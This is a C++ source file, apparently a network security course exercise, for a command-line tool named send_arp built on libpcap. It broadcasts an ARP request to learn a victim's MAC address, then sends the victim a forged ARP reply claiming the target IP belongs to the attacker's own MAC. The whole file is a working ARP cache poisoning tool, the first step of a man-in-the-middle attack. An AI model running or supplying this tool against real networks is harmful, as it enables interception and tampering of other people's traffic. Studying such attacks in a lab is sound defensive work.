#include <cstdio>
#include "arp.h"

void usage() {
  puts("syntax: send_arp <interface> <sender IP> <target IP> [<sender ip 2> <target ip 2> ...]");
  puts("sample: send_arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip my_ip = get_my_ip(dev);;
	Mac my_mac = get_my_mac(dev);

	printf("My IP  : %s\n", std::string(my_ip).c_str());
	printf("My Mac : %s\n", std::string(my_mac).c_str());

	for (int i = 2; i < argc; i+=2) {
		if (argc < i+2) {
			usage();
			return -1;
		}
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i+1]);

		puts("Sending arp packet to broadcast...");
		puts("\t[Request] mac addresss of sender_ip");
		send_arp(handle, ArpHdr::Request, my_mac, my_ip, Mac(MAC_BROADCAST), sender_ip);

		EthArpPacket packet = receive_arp(handle, sender_ip);
		Mac sender_mac = Mac(packet.arp_.smac_);

		puts("Received arp packet reply.");
		printf("\t[Sender Mac] %s\n", std::string(sender_mac).c_str());

		puts("Sending arp packet to sender...");
		puts("\t[Reply] mac address of target_ip is my mac address");
		send_arp(handle, ArpHdr::Reply, my_mac, target_ip, sender_mac, sender_ip);

		puts("Done!");
	}
	pcap_close(handle);
	return 0;
}
